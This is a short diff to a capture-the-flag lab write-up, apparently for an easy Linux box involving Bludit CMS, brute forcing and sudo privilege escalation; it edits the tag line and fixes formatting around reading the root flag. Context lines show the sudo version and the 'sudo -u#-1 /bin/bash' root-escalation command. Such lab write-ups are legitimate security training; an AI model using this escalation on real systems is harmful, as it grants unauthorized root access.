@@ -3,7 +3,7 @@
 ### Lab Details 
 
 - Difficulty: Easy
-- Type:   Linux
+- Type: Web app, Web Enum, Blundit CMS, Brute Forcing, Sudo, Priv Esc, Linux
 
 #### Tasks
 
@@ -154,7 +154,7 @@ Sudo version 1.8.25p1
 ```
 sudo -u#-1 /bin/bash
 ```
-- `cat /root/root.txt
+- `cat /root/root.txt`
 
 
 #### Lesson Learned
